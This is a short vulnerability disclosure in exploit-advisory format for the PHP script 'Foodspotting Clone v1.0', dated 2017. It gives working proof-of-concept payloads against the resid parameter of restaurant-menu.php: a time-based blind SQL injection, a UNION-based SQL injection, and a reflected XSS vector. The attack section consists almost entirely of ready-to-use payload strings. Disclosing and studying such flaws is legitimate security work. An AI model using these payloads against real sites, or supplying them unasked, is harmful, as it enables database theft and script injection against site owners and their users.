@@ -1,0 +1,44 @@
+# Exploit Title: Foodspotting Clone v1.0 - SQL Injection/Reflected XSS
+# Date: 2017-09-13
+# Exploit Author: 8bitsec
+# Vendor Homepage: http://www.phpscriptsmall.com/
+# Software Link: http://www.phpscriptsmall.com/product/foodspotting-clone/
+# Version: 1.0
+# Tested on: [Kali Linux 2.0 | Mac OS 10.12.6]
+# Email: contact@8bitsec.io
+# Contact: https://twitter.com/_8bitsec
+
+Release Date:
+=============
+2017-09-13
+
+Product & Service Introduction:
+===============================
+Foodspotting Clone allows you to initiate your very own social networking website that similar appearance as Foodspotting and additional food lover websites.
+
+Technical Details & Description:
+================================
+
+Reflected XSS/SQL injection on [resid] parameter.
+
+Proof of Concept (PoC):
+=======================
+
+SQLi:
+
+http://localhost/[path]/restaurant-menu.php?resid=' AND SLEEP(5) AND 'nhSH'='nhSH
+
+Parameter: resid (GET)
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: resid=' AND SLEEP(5) AND 'nhSH'='nhSH
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 14 columns
+    Payload: resid=' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x7176627a71,0x435a72445467737074496d6e5a7855726f6e534c4b6469705774427550576c70676d425361626642,0x71767a6271),NULL,NULL,NULL-- aIwp
+
+Reflected XSS:
+
+http://localhost/[path]/restaurant-menu.php?resid=/"><svg/onload=alert(/8bitsec/)>
+==================
+8bitsec - [https://twitter.com/_8bitsec]
